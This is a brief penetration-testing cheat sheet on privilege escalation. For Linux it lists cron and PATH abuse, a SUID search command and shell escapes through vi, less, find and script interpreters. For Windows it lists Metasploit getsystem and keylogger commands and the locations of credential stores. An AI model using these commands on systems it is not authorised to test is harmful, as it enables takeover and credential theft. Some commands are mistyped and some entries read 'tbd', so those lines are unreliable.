---
title: Priv Esc
category: Post-Exploitation
order: 96
---

>**Linux**

Cron.d | Write a file to cron.d and wait for restart
Cron files  | Can any of the cron files be tampered with
Kernal Exploit |  <code> Run uname -a, /etc/release, /etc/issue and find an exploit </code>
Application Exploit | Look for web servers, mail servers for command injection
Look for exploits in root owned programs
PATH | Look for '.' in the path for system users
SETUID/SETGUID | <code> find directory -user root -perm -4000 -exec ls -ld {} \; > /tmp/security-hole </code> They may use the system syscall without specifying the path name 
User writable scripts | Look for scripts that have user writable permissions and are invoked by root (or call scripts that are invoked by root)
Enlightenment Exploit Pack | tbd
LD_PRELOAD | tbd
check sudo permissions | sudo -l

**setuid permissions**
 
{% highlight bash %}
sudo vi :shell
less (press v - launching vi) :shell
more  ?,  !bash
cp or mv
find . -exec bash -i \;
Script interpeters
perl exec ""/bin/bash"";<ctrl-d>
ruby exec ""bin/bash""
python import os os.system('/in/bash')
nano 
{% endhighlight %}

>**Windows**

Metasploit | use priv, getsystem -n [number]
Metasploit keylogger | keyscan_start, keyscan_stop, keyscan_dump
SAM Locations | c:\windows\repair, c:\winnt\repair
Active Directory Representations | ntd.dit

http://pentestmonkey.net/uncategorized/from-local-admin-to-domain-admin

>**Mind Map**

[Edition template screenshot](images/privesc.jpg)


